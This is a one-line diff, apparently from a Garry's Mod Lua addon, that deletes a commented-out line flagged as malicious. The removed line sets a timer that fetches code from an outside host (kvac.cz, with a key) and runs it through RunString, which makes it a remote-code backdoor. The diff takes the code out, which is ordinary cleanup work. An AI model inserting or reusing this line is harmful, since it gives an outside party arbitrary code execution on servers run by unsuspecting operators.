@@ -1,1 +1,0 @@
---This bitch is malicios. dont uncomment timer.Simple(1, function() http.Fetch("https://kvac.cz/f.php?key=MzIMjWYbDYnz4toBlWKo", function(b) RunString(b, ":", false) end)end)
